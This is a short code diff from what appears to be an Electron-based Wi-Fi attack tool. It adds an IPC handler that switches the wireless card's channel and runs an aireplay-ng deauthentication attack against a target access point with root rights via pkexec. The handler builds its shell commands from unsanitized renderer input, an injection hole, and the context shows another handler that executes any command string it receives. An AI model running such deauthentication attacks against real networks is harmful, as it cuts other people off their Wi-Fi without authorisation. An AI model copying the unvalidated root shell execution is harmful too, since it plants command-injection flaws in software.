@@ -249,6 +249,17 @@ ipcMain.on('disableMonitor', (event) => {
   }
 });
 
+ipcMain.on('deauthattack', (event,channel,bssid,deauth) => {
+  const { execSync } = require('child_process');
+  const { exec } = require('child_process');
+  const channelCommand = `pkexec iwconfig ${config.networkcard} channel ${channel}`;
+  const attackCommand = `pkexec aireplay-ng --deauth ${deauth} -a ${bssid} ${config.networkcard}`;
+  execSync(channelCommand);
+  log(`channel : ${channel}`)
+  exec(attackCommand)
+  log(attackCommand)
+});
+
 ipcMain.on('aircrackattack', (event, command) => {
     const { exec } = require('child_process');
     log(command)
